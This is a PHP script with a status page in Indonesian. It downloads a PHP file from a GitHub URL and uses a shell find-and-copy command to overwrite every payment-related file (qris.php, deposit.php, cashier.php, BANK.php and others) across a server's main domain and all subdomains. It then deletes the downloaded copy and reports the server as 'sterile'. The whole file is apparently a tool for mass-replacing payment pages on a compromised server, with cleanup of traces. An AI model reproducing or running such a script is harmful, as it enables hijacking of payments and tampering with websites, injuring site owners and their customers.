<?php
set_time_limit(0);
ini_set('memory_limit', '512M');


ob_implicit_flush(true);
while (ob_get_level()) ob_end_flush();


$rootPath = dirname(__DIR__) . '/'; 

$sourceUrl = 'https://raw.githubusercontent.com/spuc3/spuc3ngine/refs/heads/main/semua.php';
$masterTmp = $rootPath . 'semua.php'; 


$targetFiles = ['qris.php', 'deposit.php', 'cashier.php', 'transaksi.php','QRIS.php','BANK.php','DEPOSIT.php'];

?>
<!DOCTYPE html>
<html lang="id">
<head>
    <meta charset="UTF-8">
    <title>⚡ Ultimate Lightning Mass Replace ⚡</title>
    <style>
        body { font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif; background: #0c0c0e; color: #fff; padding: 20px; }
        .container { max-width: 900px; margin: 0 auto; background: #15151e; padding: 25px; border-radius: 8px; box-shadow: 0 4px 20px rgba(0,0,0,0.6); border: 1px solid #222; }
        h2 { color: #00ffcc; margin-top: 0; border-bottom: 2px solid #252535; padding-bottom: 10px; text-shadow: 0 0 10px rgba(0,255,204,0.3); }
        .status-box { display: flex; align-items: center; background: #222230; padding: 15px; border-radius: 5px; margin-bottom: 20px; border-left: 5px solid #00ffcc; }
        .spinner { border: 4px solid rgba(255,255,255,0.1); width: 36px; height: 36px; border-radius: 50%; border-left-color: #00ffcc; animation: spin 1s linear infinite; margin-right: 15px; }
        @keyframes spin { 0% { transform: rotate(0deg); } 100% { transform: rotate(360deg); } }
        .console { background: #000; font-family: 'Courier New', Courier, monospace; padding: 15px; border-radius: 5px; height: 350px; overflow-y: auto; font-size: 13px; line-height: 1.6; border: 1px solid #1a1a1a; color: #aaa; }
        .success { color: #00ffcc; font-weight: bold; }
        .error { color: #ff3333; font-weight: bold; }
        .info { color: #3399ff; }
        .done-box { background: #00b386; color: #fff; padding: 15px; border-radius: 5px; text-align: center; font-weight: bold; font-size: 18px; margin-top: 20px; display: none; box-shadow: 0 0 15px rgba(0,179,134,0.4); }
    </style>
</head>
<body>

<div class="container">
    <h2>⚡ Ultimate Lightning Mass Replace (Mode Mundur 1 Langkah)</h2>
    
    <div class="status-box" id="loading-box">
        <div class="spinner"></div>
        <div>
            <strong style="font-size: 16px;">Menjalankan Engine Kernel Linux...</strong><br>
            <span style="font-size: 12px; color: #ccc;">Mundur ke folder utama dan menyapu bersih seluruh subdomain.</span>
        </div>
    </div>

    <div class="console" id="console-log">
        <?php
        echo "<span class='info'>[1/3] Mengunduh file master dari GitHub...</span><br>";
        flush();

        // 1. Download file master menggunakan cURL
        $ch = curl_init($sourceUrl);
        $fp = fopen($masterTmp, 'wb');
        curl_setopt($ch, CURLOPT_FILE, $fp);
        curl_setopt($ch, CURLOPT_HEADER, 0);
        curl_setopt($ch, CURLOPT_FOLLOWLOCATION, true);
        curl_exec($ch);
        curl_close($ch);
        fclose($fp);

        if (!file_exists($masterTmp) || filesize($masterTmp) == 0) {
            echo "<span class='error'>[ERROR] Gagal mengunduh file master dari GitHub!</span><br></div></div></body></html>";
            echo "<script>document.getElementById('loading-box').style.display = 'none';</script>";
            exit;
        }

        echo "<span class='success'>[SUKSES] File master berhasil diunduh dan disimpan sementara.</span><br><br>";
        echo "<span class='info'>[2/3] Menyisir folder utama dan seluruh subdomain di: {$rootPath}...</span><br>";
        flush();

        
        $findCriteria = [];
        foreach ($targetFiles as $index => $file) {
            $findCriteria[] = ($index === 0 ? "" : "-o ") . "-name " . escapeshellarg($file);
        }
        $criteriaString = implode(" ", $findCriteria);

        
        $cmd = "find " . escapeshellarg($rootPath) . " -type f \( $criteriaString \) -exec cp -f " . escapeshellarg($masterTmp) . " {} \; 2>&1";
        shell_exec($cmd);

        echo "<span class='success'>[SUKSES] Semua file (jawa, bali, sumatra, kalimantan) di semua folder telah ditimpa!</span><br><br>";
        flush();
        
        
        echo "<span class='info'>[3/3] Membersihkan file sisa di server...</span><br>";
        @unlink($masterTmp);
        echo "<span class='success'>[SUKSES] Pembersihan selesai. Server kembali steril.</span><br>";
        flush();
        ?>
    </div>

    <div class="done-box" id="done-box">
        ⚡ LUAR BIASA! Seluruh file target di domain utama & semua subdomain selesai diperbarui secepat kilat!
    </div>
</div>

<script>

  
    document.getElementById('loading-box').style.display = 'none';
    document.getElementById('done-box').style.display = 'block';
    var c = document.getElementById('console-log'); 
    c.scrollTop = c.scrollHeight;
</script>

</body>
</html>
